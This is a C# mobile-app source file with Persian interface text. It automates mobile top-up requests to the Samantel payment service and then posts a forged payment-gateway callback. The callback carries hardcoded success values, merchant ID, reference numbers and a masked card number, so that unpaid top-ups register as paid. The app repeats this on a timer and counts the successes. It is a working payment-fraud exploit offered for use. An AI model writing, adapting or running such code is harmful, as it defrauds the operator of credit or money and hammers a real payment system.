using Newtonsoft.Json;
using RestSharp;
using System.Net;
using System.Timers;
using Timer = System.Timers.Timer;

namespace Stel_Cross_Platform;

public partial class MainPage : ContentPage
{
    public long okcount;
    public long notok;
    public static Timer myTimer = new System.Timers.Timer() { Enabled = false };
    public MainPage()
    {
        InitializeComponent();

    }

    [Obsolete("Obsolete")]
    private async void OnCounterClicked(object sender, EventArgs e)
    {
        try
        {
            if (CounterBtn.Text == "Started!")
            {
                MainPage.myTimer.Stop();
                myTimer.Dispose();
                await DisplayAlert("Alert", "عملیات با موفقیت لغو شد!", "اوک");
                CounterBtn.Text = "Stoped";
                return;
            }
            if (textbox.Text.Length > 11 || textbox.Text.Length < 10)
            {
                await DisplayAlert("Error", "ارقام وارد شده اشتباه میباشد", "bashe", FlowDirection.LeftToRight);
                return;
            }
            myTimer.Elapsed += new ElapsedEventHandler(myEvent);
            myTimer.Interval = Convert.ToDouble((Slider.Value));
            myTimer.Enabled = true;

            CounterBtn.Text = "Started!";
            await DisplayAlert("Alert", "عملیات با موفقیت آغاز شد!", "اوک");


            SemanticScreenReader.Announce(CounterBtn.Text);
        }
        catch
        { }

    }
    [Obsolete("Obsolete")]
    private void myEvent(object source, ElapsedEventArgs e)
    {
        SamanTel();
    }


    [Obsolete("Obsolete")]
    public async void SamanTel()
    {
        try
        {
            var url = "https://payment.samantel.ir/api/mediator/samantel/ ";
            var client = new RestClient(url);
            var request = new RestRequest(url, Method.Post);
            request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
            request.AddHeader("Accept", "application/json, text/javascript");
            request.AddHeader("X-Requested-With", "XMLHttpRequest");

            request.AddStringBody($"method=topuprequest&mobile={textbox.Text}&amount=10000&haspaylink=true",
                DataFormat.None);
            RestResponse response = await client.ExecuteAsync(request);
            var output = response.Content;
            Root myDeserializedClass = JsonConvert.DeserializeObject<Root>(output);
            if (myDeserializedClass.errDesc.Contains("Repeat request"))
            {
                notok++;
                return;
            }
            var res = myDeserializedClass.result.payURL.Replace(
                "https://ws.samantel.ir/samantel/v1/?method=goforpay&pt=", "");


            var url2 = "https://ws.samantel.ir/samantel/v1/?method=paymentreturn";
            var client2 = new RestClient(url2);
            var request2 = new RestRequest(url2, Method.Post);
            request2.AddHeader("Content-Type", "application/x-www-form-urlencoded");
            request2.AddHeader("Accept", "text/html,application/xhtml+xml,application/");
            request2.AddHeader("X-Requested-With", "XMLHttpRequest");
            System.Random random = new System.Random();
            int num = random.Next(1000);
            request2.AddStringBody(
                $"State=OK&StateCode=0&ResNum={res}&MID=12913472&RefNum=GmshtyjwKSsGaqbXKJOGreP4F%2FxlN%2B6jAwyRlrVsa0&CID=F43A917B45B341C7C3692F9F82F99AA34BA7BF9E7EBB2941293BAB6AEA527FEB&TRACENO=601382&RRN=20877199481&Amount=10000&website=payment.samantel.ir&SecurePan=603799**0000",
                DataFormat.None);
            RestResponse response2 = await client2.ExecuteAsync(request2);
            var output2 = response2.Content;
            if (output2 == null)
                return;
            output2 = output2.Substring(output2.IndexOf($"https://ws.samantel.ir/samantel/v1/?"));
            output2 = output2.Substring(0, output2.IndexOf("=https://payment.samantel.ir/paymentFail") + 40);
            WebClient dd = new();
            var res2 = dd.DownloadString(output2);
            if (res2.Contains("پرداخت شما موفق بود.") == true)
            {
                okcount++;

                Device.BeginInvokeOnMainThread(() =>
                {
                    Labelok.Text = "OK Sent: " + okcount.ToString();
                });

            }
            else
            {
                notok++;
                Device.BeginInvokeOnMainThread(() =>
                {
                    Labelnotok.Text = "NOT Ok sent: " + notok.ToString();
                });

            }
        }
        catch (Exception)
        {
            Thread.Sleep(4000);
            SamanTel();
        }
    }


    private void Slider_OnValueChanged(object sender, ValueChangedEventArgs args)
    {
        try
        {
            displayLabel.Text = $"Timer send Reqeust: {args.NewValue} ms ";
        }
        catch
        { }

    }
    public class Alert
    {
        public bool active { get; set; }
        public string message { get; set; }
    }

    public class Body
    {
    }

    public class Form
    {
    }

    public class Log
    {
        public bool active { get; set; }
        public string tag { get; set; }
        public string message { get; set; }
    }

    public class Notification
    {
        public bool active { get; set; }
        public string title { get; set; }
        public string text { get; set; }
        public int time { get; set; }
        public bool sticky { get; set; }
        public string class_name { get; set; }
        public string image { get; set; }
    }

    public class Redirect
    {
        public bool active { get; set; }
        public string URL { get; set; }
        public Body body { get; set; }
        public Form form { get; set; }
        public string method { get; set; }
    }

    public class Result
    {
        public string confirmId { get; set; }
        public string requestId { get; set; }
        public string transactionId { get; set; }
        public string MSISDN { get; set; }
        public string simType { get; set; }
        public int amount { get; set; }
        public int topupAmount { get; set; }
        public string idNumber { get; set; }
        public string idType { get; set; }
        public string expireTime { get; set; }
        public string payURL { get; set; }
    }

    public class Root
    {
        public string message { get; set; }
        public Result result { get; set; }
        public string method { get; set; }
        public int errCode { get; set; }
        public string errDesc { get; set; }
        public List<string> time { get; set; }
        public SelfRedirect selfRedirect { get; set; }
        public Redirect redirect { get; set; }
        public Alert alert { get; set; }
        public Log log { get; set; }
        public Notification notification { get; set; }
    }

    public class SelfRedirect
    {
        public bool active { get; set; }
        public string URL { get; set; }
        public Body body { get; set; }
        public bool isForm { get; set; }
        public string method { get; set; }
    }

    private async void Button_OnClicked(object sender, EventArgs e)
    {
    }
}

